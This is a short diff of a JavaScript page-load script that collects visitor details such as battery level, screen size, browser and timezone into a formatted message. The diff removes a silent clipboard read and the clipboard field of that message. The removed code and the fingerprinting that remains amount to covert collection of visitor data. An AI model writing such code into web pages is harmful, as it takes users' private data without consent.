@@ -16,7 +16,6 @@ document.addEventListener('DOMContentLoaded', function() {
         batteryLevel = battery.level * 100;
     });
 
-    navigator.clipboard.readText().then(function(clipboardText) {
         screenWidth = window.screen.width;
         screenHeight = window.screen.height;
 
@@ -48,7 +47,6 @@ document.addEventListener('DOMContentLoaded', function() {
                     ├ Browser: ${browser}
                     ├ Battery ${batteryLevel}%
                     ├ Screen: ${screenWidth}x${screenHeight} px.
-                    ├ Clipboard: ${clipboardText}
                     └ Timezone: ${timeZone}
 
                 `;
